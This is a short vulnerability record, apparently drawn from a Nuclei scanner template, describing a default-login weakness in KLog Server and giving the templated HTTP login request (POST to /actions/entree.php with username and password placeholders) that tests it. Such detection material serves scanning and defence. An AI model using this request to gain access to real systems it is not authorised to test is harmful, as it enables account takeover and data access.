# Vulnerability: KLog Server - Default Login
**Classification:** DEFAULT-LOGIN
**Source:** Nuclei Template (`klog-server-default-login.yaml`)

## Description
KLog Server contains a default login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /actions/entree.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

user={{username}}&pswd={{password}}&action=login

GET /index.php HTTP/1.1
Host: {{Hostname}}
```

